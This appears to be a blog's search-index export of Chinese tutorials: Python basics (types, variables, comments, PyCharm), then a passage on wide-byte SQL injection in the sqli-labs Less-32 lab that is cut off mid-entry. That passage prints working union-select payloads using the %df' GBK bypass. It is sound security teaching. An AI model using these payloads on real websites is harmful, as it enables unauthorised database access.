class="line">print(<span class="number">10</span>+<span class="number">1.1</span>) <span class="comment"># int和float之间可以想加</span></span><br><span class="line">print(age &gt; <span class="number">18</span>)</span><br><span class="line"><span class="comment">#整数/浮点数=浮点数</span></span><br><span class="line">print(<span class="number">3</span>/<span class="number">2</span>) <span class="comment"># 1.5</span></span><br><span class="line"><span class="comment">#整数//浮点数=整数(整除，进行整除时会把不够的值抛弃掉)</span></span><br><span class="line">print(<span class="number">1</span>//<span class="number">2</span>) <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><hr><h1 id="字符串类型str"><a href="#字符串类型str" class="headerlink" title="字符串类型str"></a>字符串类型str</h1><p>用来记录人的名字，家庭住址，性别等<strong>描述性质</strong>的状态，名字、一段话、信息、性别等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用引号包含的一串字符</span></span><br><span class="line">name = <span class="string">&#x27;Tony&#x27;</span></span><br><span class="line">address = <span class="string">&#x27;上海市浦东新区&#x27;</span></span><br><span class="line">sex = <span class="string">&#x27;男&#x27;</span></span><br><span class="line"><span class="comment"># 用单引号、双引号、多引号，都可以定义字符串</span></span><br><span class="line"><span class="comment">#1、需要考虑引号嵌套的配对问题</span></span><br><span class="line">msg = <span class="string">&quot;My name is Tony , I&#x27;m 18 years old!&quot;</span> <span class="comment">#内层有单引号，外层就需要用双引号(反之亦然)</span></span><br><span class="line">    msg = <span class="string">&quot;My name is Tony , I\&#x27;m 18 years old!&quot;</span> <span class="comment">#使用反斜杠来转义引号</span></span><br><span class="line"><span class="comment">#2、多引号可以写多行字符串</span></span><br><span class="line">msg = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        天下只有两种人。比如一串葡萄到手，一种人挑最好的先吃，另一种人把最好的留到最后吃。</span></span><br><span class="line"><span class="string">        照例第一种人应该乐观，因为他每吃一颗都是吃剩的葡萄里最好的；第二种人应该悲观，因为他每吃一颗都是吃剩的葡萄里最坏的。</span></span><br><span class="line"><span class="string">         不过事实却适得其反，缘故是第二种人还有希望，第一种人只有回忆。</span></span><br><span class="line"><span class="string">      &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="变量名与字符串值的区别"><a href="#变量名与字符串值的区别" class="headerlink" title="变量名与字符串值的区别"></a>变量名与字符串值的区别</h2><p>区别在于是否有引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name <span class="comment"># 被认为是name变量(python不能只定义变量不赋值)</span></span><br><span class="line"><span class="string">&#x27;name&#x27;</span> <span class="comment"># 被认为是值(python可以直接写值，但由于引用计数为0，写完即毁)</span></span><br></pre></td></tr></table></figure><h2 id="字符串相加"><a href="#字符串相加" class="headerlink" title="字符串相加"></a>字符串相加</h2><p>字符串之间使用加号是拼接含义，且只能字符串与字符串之间进行(字符串相加效率底，所以不推荐使用)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;my name is&#x27;</span></span><br><span class="line">y = <span class="string">&#x27; kinght&#x27;</span></span><br><span class="line">print(x+y)</span><br><span class="line"><span class="comment">#输出：my name is kinght</span></span><br></pre></td></tr></table></figure><h2 id="字符串相乘"><a href="#字符串相乘" class="headerlink" title="字符串相乘"></a>字符串相乘</h2><p>字符串相乘含义是字符串重复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;helloworld\n&#x27;</span>*<span class="number">10</span>)</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure><hr><h1 id="列表类型"><a href="#列表类型" class="headerlink" title="列表类型"></a>列表类型</h1><p>需要用一个变量记录多个学生的姓名，用数字类型是无法实现，字符串类型确实可以记录下来，比如stu_names=’张三 李四 王五’</p><p>但存的目的是为了取，此时若想取出第二个学生的姓名实现起来相当麻烦，而列表类型就是专门用来记录多个同种属性的值（比如同一个班级多个学生的姓名、同一个人的多个爱好等），并且存取都十分方便</p><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>记录多个值，并且可以按照索引取指定位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在[]内用逗号进行分隔多个任意类型的值，并且一个值称为一个元素</span></span><br><span class="line"><span class="comment">#列表内布可以嵌套列表</span></span><br><span class="line">demo=[<span class="number">10</span>,<span class="number">3.14</span>,<span class="string">&#x27;aaa&#x27;</span>,[<span class="number">111</span>,<span class="string">&#x27;bbb&#x27;</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment">#取值是索引对应值，索引从0开始，0代表第一个</span></span><br><span class="line">print(demo[<span class="number">1</span>]) <span class="comment">#取值3.14 索引从0开始，即1取第二个值</span></span><br><span class="line">print(demo[<span class="number">3</span>]) <span class="comment">#取值[111,&#x27;bbb&#x27;]</span></span><br><span class="line">print(demo[<span class="number">3</span>][<span class="number">1</span>]) <span class="comment">#取值&#x27;bbb&#x27; 即demo索引3号列表的，1号索引</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#倒数取值</span></span><br><span class="line">print(demo[<span class="number">-1</span>]) <span class="comment">#取值取值[111,&#x27;bbb&#x27;] 取倒数第一个</span></span><br></pre></td></tr></table></figure><hr><h1 id="字典类型"><a href="#字典类型" class="headerlink" title="字典类型"></a>字典类型</h1><p>需要用一个变量记录多个值，但多个值是不同属性的，比如人的姓名、年龄、身高，用列表可以存，但列表是用索引对应值的，而索引不能明确地表示值的含义，这就用到字典类型</p><p>字典类型是用key：key可以对value有描述性的功能，value形式来存储数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义：在&#123;&#125;内用逗号分隔多个key:value</span></span><br><span class="line"><span class="comment">#存储方式&#123;key:value&#125;</span></span><br><span class="line">person_info=&#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">22</span>,<span class="string">&#x27;height&#x27;</span>:<span class="number">183</span>&#125;</span><br><span class="line"><span class="comment">#取值使用key</span></span><br><span class="line">print(person_info[<span class="string">&#x27;name&#x27;</span>]) <span class="comment">#取值为kinght</span></span><br></pre></td></tr></table></figure><h2 id="字典与列表的嵌套"><a href="#字典与列表的嵌套" class="headerlink" title="字典与列表的嵌套"></a>字典与列表的嵌套</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字典可以嵌套，嵌套取值如下(假设取学生信息)</span></span><br><span class="line">students = [</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">22</span>,<span class="string">&#x27;hobbies&#x27;</span>:[<span class="string">&#x27;play&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;tony&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">20</span>,<span class="string">&#x27;hobbies&#x27;</span>:[<span class="string">&#x27;play&#x27;</span>,<span class="string">&#x27;eat&#x27;</span>]&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;Tom&#x27;</span>,<span class="string">&#x27;age&#x27;</span>:<span class="number">21</span>,<span class="string">&#x27;hobbies&#x27;</span>:[<span class="string">&#x27;play&#x27;</span>,<span class="string">&#x27;red&#x27;</span>]&#125;,</span><br><span class="line">]</span><br><span class="line">print(students[<span class="number">0</span>][<span class="string">&#x27;hobbies&#x27;</span>][<span class="number">1</span>]) <span class="comment">#取第一个学生的爱好的第二个sleep</span></span><br></pre></td></tr></table></figure><hr><h1 id="布尔bool"><a href="#布尔bool" class="headerlink" title="布尔bool"></a>布尔bool</h1><p>用来记录真假这两种状态，布尔一共就两个值<code>True</code>和<code>False</code></p><p>它本身最大的作用就是来进行条件判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0、none、空表示为假</span><br><span class="line">其他表示为真</span><br></pre></td></tr></table></figure><p>也可以用于代表定义一些其他的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用真表示男，假表示女</span></span><br><span class="line">name = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;Gender&#x27;</span>:<span class="string">&#x27;True&#x27;</span>&#125;,</span><br><span class="line">name = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;dimple&#x27;</span>,<span class="string">&#x27;Gender&#x27;</span>:<span class="string">&#x27;False&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>6.python语法入门之变量</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/6.python%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E4%B9%8B%E5%8F%98%E9%87%8F/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/6.python%E8%AF%AD%E6%B3%95%E5%85%A5%E9%97%A8%E4%B9%8B%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<p>我们学习python语言是为了控制计算机，为了让计算机能够像人一样去工作，所以在python这门语言中，所有语法存在的意义都是为了让计算机具备人的某一项技能，这句话是我们理解后续所有python语法的根本</p><a id="more"></a><hr><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>变量就是可以变化的量，量指的是事物的状态，比如人的年龄、性别，游戏角色的等级、金钱等等</p><h2 id="为什么要有变量？"><a href="#为什么要有变量？" class="headerlink" title="为什么要有变量？"></a>为什么要有变量？</h2><p>为了让计算机能够像人一样去记忆事物的某种状态，并且状态是可以发生变化的</p><p>程序执行的本质就是一系列状态的变化，变是程序执行的直接体现，所以我们需要有一种机制能够反映或者说是保存下来程序执行时状态，以及状态的变化</p><p>打个比方，我们需要记忆一个人的体貌特征，他的体貌特征是会随着时间变化而改变的，所以我们要在大脑中开辟一块记忆空间，把这个记忆空间给命名成这个人的名字，然后把他的体貌特征给存放进去，下次再见到他的时候就修改这块空间里的内容就好了</p><p>同样的，解释器执行到变量定义的代码时会申请内存空间来存放变量值，将变量值的内存地址绑定给变量名，每次修改只需要修改变量对应内存地址里存放的值即可</p><h2 id="变量的使用"><a href="#变量的使用" class="headerlink" title="变量的使用"></a>变量的使用</h2><p>原则：先定义后引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&#x27;kinght&#x27;</span> <span class="comment">#定义变量name 并赋值kinght</span></span><br><span class="line">print(name)<span class="comment">#引用name变量 #print 打印</span></span><br></pre></td></tr></table></figure><p>定义就是在内存中开辟一块名为name空间，赋值就是将kinght的字符串存放了进去，引用就是输出引用了房间号为name的值，那就是kinght</p><h2 id="变量的内存管理"><a href="#变量的内存管理" class="headerlink" title="变量的内存管理"></a>变量的内存管理</h2><p>前面提到过，申请变量其实就是占用内存空间，但内存的大小是一定的，如果内存空间不使用了，而程序还在运行，不停的加载占用内存空间，就可能会导致内存溢出，所以不使用的内存空间就需要及时释放</p><h3 id="内存管理：垃圾回收机制"><a href="#内存管理：垃圾回收机制" class="headerlink" title="内存管理：垃圾回收机制"></a>内存管理：垃圾回收机制</h3><blockquote><p>PS:这里只是简单阐述，详细内容请参考后文</p></blockquote><p>垃圾回收机制（简称GC）是Python解释器自带一种机制，专门用来回收不可用的变量值所占用的内存空间</p><blockquote><p>引用计数：一个内存空间上捆绑了几个变量的名字</p><p>垃圾：当一个变量值被绑定的变量名个数为0时，该变量值无法被访问到，称之为垃圾</p></blockquote><p>简单来说：用来回收没有关联变量名的值，引用计数为0的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line">print(x)</span><br><span class="line"><span class="keyword">del</span> x  <span class="comment">#解除了x的绑定关系</span></span><br><span class="line">print(x)  <span class="comment">#由于解除了绑定关系，所以报错</span></span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200820171436444.png" alt="image-20200820171436444"></p><p>解除了x绑定了之后，空间对应的引用计数就为0，python就会释放这块空间</p><h2 id="变量的组成部分"><a href="#变量的组成部分" class="headerlink" title="变量的组成部分"></a>变量的组成部分</h2><h3 id="变量名"><a href="#变量名" class="headerlink" title="变量名"></a>变量名</h3><p>变量名是用于指向内存地址、访问地址的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命名规范</span></span><br><span class="line"><span class="number">1.</span> 变量名只能是 字母、数字或下划线的任意组合</span><br><span class="line"><span class="number">2.</span> 变量名的第一个字符不能是数字</span><br><span class="line"><span class="number">3.</span> 关键字不能声明为变量名，常用关键字如下</span><br><span class="line">[<span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>,<span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br><span class="line">关键词不需要硬记，通常继承开发环境遇到关键词会变色</span><br></pre></td></tr></table></figure><p>变量命名应该见名之意，但为了规范最好不要写拼音和中文汉字，在见名之意的情况下尽可能短</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变量名命名风格</span></span><br><span class="line"><span class="number">1.</span>纯小写加下划线(python中推荐)</span><br><span class="line">kinght_blog</span><br><span class="line"><span class="number">2.</span>驼峰命名法(每个单词首字母大写)</span><br><span class="line">KinghtBlog</span><br></pre></td></tr></table></figure><h3 id="赋值符号"><a href="#赋值符号" class="headerlink" title="赋值符号"></a>赋值符号</h3><p>将变量值的内存地址绑定给变量名</p><h3 id="变量值"><a href="#变量值" class="headerlink" title="变量值"></a>变量值</h3><p>代表记录事物的状态</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 变量值三个重要特征</span></span><br><span class="line">id：反应的是变量值的内存地址，内存地址不同id则不同</span><br><span class="line">查看id号：print(id(name))</span><br><span class="line">type:不同类型的值用来表示记录不同的状态</span><br><span class="line">    查看type：print(type(name))</span><br><span class="line">value:值本身</span><br><span class="line">    查看值：print(name)</span><br></pre></td></tr></table></figure><h3 id="变量比较"><a href="#变量比较" class="headerlink" title="变量比较"></a>变量比较</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># is:比较左右两个值身份id是否相等</span></span><br><span class="line">x <span class="keyword">is</span> y</span><br><span class="line"><span class="comment"># ==：比较两个值的值是否相等</span></span><br><span class="line">x == y</span><br></pre></td></tr></table></figure><p><strong>id不同的情况下，值不一定相等，即两块不同的内存里可以存在相同的值</strong></p><p><strong>id相同的情况下，值一定相等，即取同个内存空间的值</strong></p><p><strong>值可能相等，id不一定相等，即若值相等，则可能是小整数池导致的</strong></p><h3 id="小整数池"><a href="#小整数池" class="headerlink" title="小整数池"></a>小整数池</h3><p>在python解释器启动那一刻开始，就会在内存中事先申请好一系列内存空间存放好常用的整数或常用的字符串</p><p>而pycharm则会申请比python解释器更广阔的小整数池</p><hr><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><p>常量就是在程序运行过程中不变的量</p><p>注意：在python中没有常量，但是在程序开发的过程中会涉及到常量的概念</p><p>变量名全部为大写的时候，程序员约定默认为常量(不是语法规范，而是行业约定)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PI = <span class="number">3.1415926</span>  <span class="comment"># 圆周率</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>5.python程序基本概念</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/5.python%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/5.python%E7%A8%8B%E5%BA%8F%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<p>其实我们的第一个程序<code>helloworld</code>已经在安装编辑器解释器的过程中完成了，但是为了更好的推进接下来的学习，我们需要对Python的一些概念以及开发环境的操作进行一些阐述</p><a id="more"></a><hr><h1 id="Python运行模式"><a href="#Python运行模式" class="headerlink" title="Python运行模式"></a>Python运行模式</h1><p>Python的运行有两种模式，一种交互式，一种做成脚本文件，交互式模式下可以即时得到代码执行结果，调试程序十分方便，若想将代码永久保存下来，则必须将代码写入脚本文件中</p><h2 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h2><p>打开idle或者在cmd窗口输入<code>python</code>，进入交互页面，就能直接输入python语句，回车即可执行</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200819003503280.png" alt="image-20200819003503280"></p><h2 id="脚本文件"><a href="#脚本文件" class="headerlink" title="脚本文件"></a>脚本文件</h2><p>以后主要就是在代码写入脚本文件中，偶尔需要打开交互式模式调试某段代码、验证结果</p><p>既：将代码写在一个后缀名为.py的文本文件中</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200819004512119.png" alt="image-20200819004512119"></p><hr><h1 id="运行python程序的步骤"><a href="#运行python程序的步骤" class="headerlink" title="运行python程序的步骤"></a>运行python程序的步骤</h1><p>由于python是解释型语言，没有编译成机器码的过程，所以在运行的时候需要配合不同平台的python解释器，将其解释成为机器语言供机器运行</p><p>在运行python程序的时候</p><ol><li>首先会启动python解释器</li><li>解释器会发送系统调用，将<code>.py</code>文件的内容从硬盘读取到内存，此时的文件还都是普通字符，没有任何意义</li><li>解释器开始逐条解释执行刚刚读入内存的<code>.py</code>文件代码，并识别python语法</li></ol><hr><h1 id="pycharm与虚拟环境"><a href="#pycharm与虚拟环境" class="headerlink" title="pycharm与虚拟环境"></a>pycharm与虚拟环境</h1><p>虚拟环境是python中非常重要的一个概念</p><p>因为python有非常多的包，来简化我们的开发，减少我们的代码量，减少迁移项目位置时候的繁琐、避免重复造轮子的过程，而包之间难免会产生重复的函数冲突，所以把所有的包全都下载在自己的开发环境中是一种非常不理智的行为</p><p>python的大佬们就想出了一个好的办法，就是用虚拟环境，把每一个项目的环境单独隔离出来，互不影响</p><p>由于创建python虚拟环境的方式太多，比如<a href="https://zhuanlan.zhihu.com/p/60647332">virtualenv、conda、Virtualenvwrapper</a>，而恰好后续需要大量使用pycharm，所以这里就直接以pycharm为例创建虚拟机环境创建项目</p><h2 id="创建虚拟环境创建新项目"><a href="#创建虚拟环境创建新项目" class="headerlink" title="创建虚拟环境创建新项目"></a>创建虚拟环境创建新项目</h2><p>我们创建新项目的时候如图选择使用python虚拟环境进行项目创建</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200819011645183.png" alt="image-20200819011645183"></p><hr><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p>在代码中，我们通常为了方便朋友和自己的阅读，需要将部分代码的功能和用法记录下来，这一部分的代码不能被编译器或者解释器说执行，所以就有了注释的概念</p><p>注释就是对代码的解释和说明，其目的是让人们能够更加轻松地了解代码。注释是编写程序时，写程序的人给一个语句、程序段、函数等的解释或提示，能提高程序代码的可读性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这是一个多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这也是一个多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">print(<span class="string">&#x27;helloworld&#x27;</span>)  <span class="comment"># 这是一个单行注释</span></span><br></pre></td></tr></table></figure><blockquote><p>按照PEP8规范，单行注释应在代码后空两格</p></blockquote><hr><h1 id="pycharm规范代码"><a href="#pycharm规范代码" class="headerlink" title="pycharm规范代码"></a>pycharm规范代码</h1><p>按照PEP8规范格式化代码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200820172101612.png" alt="image-20200820172101612"></p><h2 id="修改规范代码快捷键"><a href="#修改规范代码快捷键" class="headerlink" title="修改规范代码快捷键"></a>修改规范代码快捷键</h2><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200820172559401.png" alt="image-20200820172559401"></p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200820172523888.png" alt="image-20200820172523888"></p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>8.宽字节注入</title>
      <link href="%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/8.%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/8.%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p> 在一些特定的场景，常规语句不能直接进行注入，但是因为程序代码开发存在一些瑕疵，我们可以使用PHP的一些特性进行注入，比如这次的宽字节注入</p><a id="more"></a><hr><h1 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h1><h2 id="什么是宽字节？"><a href="#什么是宽字节？" class="headerlink" title="什么是宽字节？"></a>什么是宽字节？</h2><p>如果一个字符其大小为1个字节的称为窄字节，如果为两个字符的就被称为宽字节</p><p>一个字节有八个bit，有255种组成方式，英文由于只有24个字符所以1个字节就够用了，而中文汉字字符数量就太多了，所以默认都是两个字节</p><p>韩文日文也需要使用两个字符来表示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GB2312、GBK、GB18030、BIG5、Shift_JIS等都是常见的宽字节(2字节)</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>比如说我们现在要查询当前数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;-1&#39; union select 1,2,(select database()) --+</span><br></pre></td></tr></table></figure><p>但是，随着SQL注入越发广为人知，程序员们会使用很多方法来防止SQL注入的发送</p><p>最初都是使用的简单的转义，比如把<code>id=-1&#39;</code>的<code>&#39;</code>转义为<code>\&#39;</code>，就能破坏闭合，导致注入不能执行，比如在32关中就是使用这种方式，让直接进行联合查询已经不会起作用</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818163503113.png" alt="image-20200818163503113"></p><p>我们来看一下32关源代码</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818163050588.png" alt="image-20200818163050588"></p><p>32关已经对SQL注入的情况有了一些防护，在第二部让特殊的字符做了一下替换，会让输入变多了一个<code>\</code>，并且我们也在第三步知道了数据库连接的时候使用了gbk编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;-1\&#39; union select 1,2,(select database()) --+</span><br></pre></td></tr></table></figure><p>我们就要想办法把<code>\</code>消灭掉</p><p>在Http传输的时候，符号是会经过一次编码的，上述语句编码后就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;-1\%27%20union%20select%201,2,(select%20database())%20--+</span><br></pre></td></tr></table></figure><p>在Mysql使用GBK编码的时候，如果前一个字符的编码大于了128后面还跟了一个字符编码的话，则会认为这两个字符编码是一个汉字值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.101.200&#x2F;Less-32&#x2F;?id&#x3D;%df&#39; union select 1,2,(select database()) --+</span><br></pre></td></tr></table></figure><p>所以前面加<code>%df</code>，来让GBK编码认为<code>%df+\</code>是一个中文汉字达到绕过的目的</p><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20200818163659050.png" alt="image-20200818163659050"></p><h3 